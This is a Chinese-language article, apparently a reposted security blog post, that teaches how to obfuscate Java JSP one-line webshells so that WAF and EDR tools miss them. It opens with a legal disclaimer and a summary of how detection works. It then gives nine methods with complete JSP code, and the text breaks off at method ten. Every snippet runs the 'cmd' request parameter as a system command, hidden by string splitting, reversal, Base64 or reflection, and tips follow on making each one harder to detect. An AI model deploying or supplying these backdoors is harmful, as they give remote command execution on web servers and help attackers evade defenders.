---
title: 30种Java一句话木马免杀方法
url: https://mp.weixin.qq.com/s/YI49D9BsjxCgiiI7MmsIMw
source: Doonsec's feed
date: 2026-04-27
fetch_date: 2026-04-28T05:23:22.711984
---

# 30种Java一句话木马免杀方法

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/1E8ULvdwpfNdZBNKVTmruicjicia3aHqW7ic7N9WNwic6RjW3ian0muMH9AicTYvRKqDsV2W5tGysAibqqgo5DDRfcGG0H5jZHhibfCdO7pHBbXppNaw/0?wx_fmt=jpeg)

# 30种Java一句话木马免杀方法

泷羽Sec-Norsea

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

以下文章来源于泷羽Sec
，作者仙草里没有草噜丶

![](http://wx.qlogo.cn/mmhead/Hp9HAaP9GFBKneKn5ryBUs0PRR7YFdhjkVm1EtmTw39DFXQog0cNn1NibPUo2tbPL2mH1HymCVxM/0)

**泷羽Sec**
.

B站：泷羽Sec，团队专注于网络安全领域的内容创作与分享，为网络安全而战。来自一个从零开始学习网安的见习生。很菜，不喜勿喷。

## 前置合规声明

本文所有内容**仅用于授权范围内的Web应用安全测试、红蓝对抗演练与网络安全人才合规培养**，严格遵循《中华人民共和国网络安全法》《数据安全法》《刑法》第285/286条等相关法律法规。

严禁将本文相关技术用于任何未经授权的网站入侵、服务器攻击、数据窃取等违法违规行为，任何未授权在他人Web容器/服务器中植入恶意代码的行为，都将承担相应的民事、行政乃至刑事责任。本文所有代码仅用于安全研究与授权测试，使用者需自行承担违规使用带来的全部法律责任。

## Java一句话木马免杀的底层逻辑

Java Web一句话木马的核心，是**通过可控的用户输入，调用Java代码执行/系统命令执行机制，实现远程命令执行、文件管理等操作**。而WAF/EDR对Java一句话木马的查杀，核心围绕5个维度展开：

1、**静态特征匹配**：检测`Runtime.getRuntime().exec()`、`ProcessBuilder`、`Class.forName()`、`Method.invoke()`、JSP`<% %>`脚本标签等敏感关键词的连续组合；

2、**语义分析**：识别「用户可控输入→反射调用→命令执行」的恶意执行链路；

3、**字节码检测**：扫描JSP编译后的Servlet字节码，识别恶意类/方法调用；

4、**行为检测**：运行时检测动态类加载、进程创建、文件读写等恶意行为；

5、**沙箱动态分析**：将JSP/Class放入沙箱运行，捕获恶意行为特征。

所有免杀方法的核心本质，都是**破坏WAF的检测维度**：要么拆分/隐藏敏感类名、方法名，要么打乱执行链路，要么利用Java合法语法/业务逻辑伪装恶意行为，要么直接操作字节码隐藏特征，最终实现「静态无特征、语义无恶意、行为无异常」。

本文所有免杀方法均适配**Java 8+主流版本**（兼容Java 11/17），覆盖Tomcat、Jetty、WebLogic等主流Web容器，按「新手入门→进阶混淆→极致免杀」的梯度排序，每一种方法均标注核心原理、实战代码、适配环境与避坑提示，拿来即可落地。

## 30种Java一句话木马免杀方法

### 第一类：基础关键词拆分与字符串变形免杀（方法1-5）

核心逻辑：把`Runtime`、`exec`、`ProcessBuilder`等敏感类名、方法名拆分为多个片段，运行时再拼接还原，直接破坏WAF的连续字符串特征匹配，新手零门槛上手。

#### 方法1：字符串简单拼接免杀

**免杀原理**：将`Runtime`、`getRuntime`、`exec`等敏感关键词拆分为多个无意义的字符串片段，运行时拼接还原，绕过WAF对连续关键词的匹配。**实战代码（JSP形式）**：

```
<%@ page import="java.lang.Runtime" %>

<%

    String cls = "Run" + "time";

    String m1 = "get" + "Runtime";

    String m2 = "ex" + "ec";

    Class<?> c = Class.forName("java.lang." + cls);

    Object obj = c.getMethod(m1).invoke(null);

    c.getMethod(m2, String.class).invoke(obj, request.getParameter("cmd"));

%>
```

**适配环境**：全Java版本+主流Web容器**避坑提示**：不要直接线性拼接，可插入无关字符串再替换，例如`String cls = "Run#time"; cls = cls.replace("#", "");`，免杀效果更强。

#### 方法2：字符串逆序免杀

**免杀原理**：把敏感类名、方法名逆序处理，运行时通过`StringBuilder.reverse()`还原，静态扫描无法直接匹配到正向的敏感关键词。**实战代码（JSP形式）**：

```
<%

    String cls = new StringBuilder("emitnuR").reverse().toString(); // Runtime逆序

    String m1 = new StringBuilder("emitnuRteg").reverse().toString(); // getRuntime逆序

    String m2 = new StringBuilder("cexe").reverse().toString(); // exec逆序

    Class<?> c = Class.forName("java.lang." + cls);

    Object obj = c.getMethod(m1).invoke(null);

    c.getMethod(m2, String.class).invoke(obj, request.getParameter("cmd"));

%>
```

**适配环境**：全Java版本+主流Web容器**避坑提示**：可配合Base64编码逆序，双重变形绕过深度特征匹配。

#### 方法3：数组下标取值免杀

**免杀原理**：把敏感类名、方法名拆分为字符数组，通过指定下标取值拼接，WAF很难匹配数组内的零散特征。**实战代码（JSP形式）**：

```
<%

    char[] clsArr = {'R','u','n','t','i','m','e'};

    char[] m1Arr = {'g','e','t','R','u','n','t','i','m','e'};

    char[] m2Arr = {'e','x','e','c'};

    String cls = "";

    String m1 = "";

    String m2 = "";

    for(int i=0;i<clsArr.length;i++) cls += clsArr[i];

    for(int i=0;i<m1Arr.length;i++) m1 += m1Arr[i];

    for(int i=0;i<m2Arr.length;i++) m2 += m2Arr[i];

    Class<?> c = Class.forName("java.lang." + cls);

    Object obj = c.getMethod(m1).invoke(null);

    c.getMethod(m2, String.class).invoke(obj, request.getParameter("cmd"));

%>
```

**适配环境**：全Java版本+主流Web容器**避坑提示**：可在数组中加入大量无关字符，打乱敏感字符的顺序，再通过指定下标取值，免杀效果翻倍。

#### 方法4：大小写混淆+动态转换免杀

**免杀原理**：Java类名、方法名区分大小写，但可以通过`Character.toUpperCase()`/`toLowerCase()`动态调整大小写，打乱固定的关键词格式，绕过WAF对固定大小写的匹配。**实战代码（JSP形式）**：

```
<%

    String clsRaw = "rUnTiMe";

    String m1Raw = "gEtRuNtImE";

    String m2Raw = "eXeC";

    // 动态调整为正确的首字母大写/小写

    String cls = Character.toUpperCase(clsRaw.charAt(0)) + clsRaw.substring(1).toLowerCase();

    String m1 = Character.toLowerCase(m1Raw.charAt(0)) + m1Raw.substring(1);

    String m2 = m2Raw.toLowerCase();

    Class<?> c = Class.forName("java.lang." + cls);

    Object obj = c.getMethod(m1).invoke(null);

    c.getMethod(m2, String.class).invoke(obj, request.getParameter("cmd"));

%>
```

**适配环境**：全Java版本+主流Web容器**避坑提示**：仅适用于基础WAF，需配合其他变形方法使用，单独使用免杀效果有限。

#### 方法5：Base64编码拆分免杀

**免杀原理**：把敏感类名、方法名、命令做Base64编码，拆分为多个片段后拼接解密，绕过WAF对`Runtime.getRuntime().exec()`固定组合的查杀。**实战代码（JSP形式）**：

```
<%@ page import="java.util.Base64" %>

<%

    String cls = new String(Base64.getDecoder().decode("amF2YS5sYW5nLlJ1bnRpbWU=")); // "java.lang.Runtime" Base64

    String m1 = new String(Base64.getDecoder().decode("Z2V0UnVudGltZQ==")); // "getRuntime" Base64

    String m2 = new String(Base64.getDecoder().decode("ZXhlYw==")); // "exec" Base64

    String cmd = new String(Base64.getDecoder().decode(request.getParameter("c")));

    Class<?> c = Class.forName(cls);

    Object obj = c.getMethod(m1).invoke(null);

    c.getMethod(m2, String.class).invoke(obj, cmd);

%>
```

**使用方式**：客户端提交的`c`参数需先做Base64编码**适配环境**：Java 8+（Base64类在Java 8引入，旧版本可用sun.misc.BASE64Decoder）**避坑提示**：不要直接使用`Base64.getDecoder().decode("...")`拼接完整类名，必须拆分编码过程，避免被WAF识别固定解码模式。

### 第二类：反射机制混淆免杀（方法6-10）

核心逻辑：Java反射是免杀的核心武器——它可以动态加载类、调用方法，代码中没有直接的`Runtime.getRuntime().exec()`调用，完全破坏WAF的静态特征匹配与语义分析链路，是实战中最常用的免杀方案。

#### 方法6：基础反射调用免杀

**免杀原理**：利用Java反射机制，通过`Class.forName()`加载类、`getMethod()`获取方法、`invoke()`调用执行，隐藏直接的函数调用特征。**实战代码（JSP形式）**：

```
<%

    try {

        Class<?> runtimeCls = Class.forName("java.lang.Runtime");

        Object runtimeObj = runtimeCls.getMethod("getRuntime").invoke(null);

        runtimeCls.getMethod("exec", String.class).invoke(runtimeObj, request.getParameter("cmd"));

    } catch (Exception e) {

        e.printStackTrace();

    }

%>
```

**适配环境**：全Java版本+主流Web容器**避坑提示**：不要直接写完整的反射链路，需配合字符串拆分、编码变形，避免被WAF识别反射调用特征。

#### 方法7：反射拆分+无关代码干扰免杀

**免杀原理**：把反射的加载、获取方法、调用拆分为多个独立步骤，中间插入大量无关的业务代码（比如字符串处理、数学计算），干扰WAF的语义分析，隐藏恶意执行链路。**实战代码（JSP形式）**：

```
<%

    // 插入无关代码：字符串处理

    String test = "test" + Math.random();

    test = test.toUpperCase();

    // 插入无关代码：数学计算

    int a = 1 + 2;

    double b = Math.sqrt(a);

    // 第一步：加载类

    Class<?> c = Class.forName("java.lang.Runtime");

    // 插入无关代码：数组操作

    int[] arr = {1,2,3};

    int sum = arr[0] + arr[1];

    // 第二步：获取getRuntime方法

    java.lang.reflect.Method m1 = c.getMethod("getRuntime");

    // 插入无关代码：日期处理

    java.util.Date d = new java.util.Date();

    // 第三步：调用getRuntime获取对象

    Object obj = m1.invoke(null);

    // 第四步：获取exec方法

    java.lang.reflect.Method m2 = c.getMethod("exec", String.class);

    // 第五步：调用exec执行命令

    m2.invoke(obj, request.getParameter("cmd"));

%>
```

**适配环境**：全Java版本+主流Web容器**避坑提示**：无关代码要尽量真实，比如模拟日志记录、参数校验，避免被WAF识别为无意义干扰。

#### 方法8：反射数组变形免杀

**免杀原理**：把要调用的方法名、参数类型存入数组，通过循环遍历数组获取方法、调用执行，结构更复杂，WAF更难识别恶意执行逻辑。**实战代码（JSP形式）**：

```
<%

    String[] methods = {"getRuntime", "exec"};

    Class<?>[] paramTypes = {null, String.class};

    Class<?> c = Class.forName("java.lang.Runtime");

    Object obj = null;

    for(int i=0;i<methods.length;i++){

        if(i == 0){

            obj = c.getMethod(methods[i]).invoke(null);

        } else {

            c.getMethod(methods[i], paramTypes[i]).invoke(obj, request.getParameter("cmd"));

        }

    }

%>
```

**适配环境**：全Java版本+主流Web容器**避坑提示**：可在数组中加入大量无关的方法名，通过条件判断只执行目标方法，进一步打乱特征。

#### 方法9：反射遍历DeclaredMethods免杀

**免杀原理**：不直接通过方法名获取Method对象，而是通过`getDeclaredMethods()`遍历类的所有方法，匹配到目标方法后再调用，完全隐藏直接的方法名特征。**实战代码（JSP形式）**：

```
<%

    Class<?> c = Class.forName("java.lang.Runtime");

    Object obj = c.getMethod("getRuntime").invoke(null);

    // 遍历所有DeclaredMethods，匹配exec方法

    java.lang.reflect.Method[] ms = c.getDeclaredMethods();

    for(java.lang.reflect.Method m : ms){

        if(m.getName().equals("exec") && m.getParameterCount() == 1){

            m.setAccessible(true);

            m.invoke(obj, request.getParameter("cmd"));

            break;

        }

    }

%>
```

**适配环境**：全Java版本+主流Web容器**避坑提示**：可配合字符串逆序、编码匹配方法名，避免直接写`equals("exec")`。

#### 方法10：反射调用ProcessBuilder免杀

**免杀原理**...